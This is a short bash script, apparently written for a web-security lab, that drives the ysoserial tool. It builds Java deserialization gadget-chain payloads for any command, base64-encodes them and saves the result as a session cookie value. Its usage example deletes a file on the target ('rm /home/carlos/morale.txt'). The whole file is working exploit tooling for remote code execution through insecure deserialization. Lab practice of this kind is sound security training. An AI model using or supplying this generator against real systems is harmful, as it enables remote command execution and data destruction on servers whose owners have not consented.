#!/usr/bin/env bash
set -euo pipefail

# Usage: ./gen_payload_cookie.sh "GADGET" "COMMAND"
# Example: ./gen_payload_cookie.sh "CommonsCollections4" "rm /home/carlos/morale.txt"

if [ $# -lt 2 ]; then
  echo "Usage: $0 <GADGET> <COMMAND>"
  exit 1
fi

GADGET="$1"
COMMAND="$2"
JAR="${YSOSERIAL_JAR:-ysoserial-all.jar}"
OUT_FILE="${OUT_FILE:-cookie.txt}"

if [ ! -f "$JAR" ]; then
  echo "Error: Jar not found: $JAR"
  echo "Set YSOSERIAL_JAR or place ysoserial-all.jar in the current directory."
  exit 1
fi

# Optionally sanitize environment so _JAVA_OPTIONS doesn't interfere
JAVA_ENV=(env -u _JAVA_OPTIONS -u JAVA_TOOL_OPTIONS)

# JVM flags MUST come before -jar
"${JAVA_ENV[@]}" \
java \
  --add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar "$JAR" "$GADGET" "$COMMAND" \
| base64 -w 0 > "$OUT_FILE"

echo "Payload saved to ${OUT_FILE}."
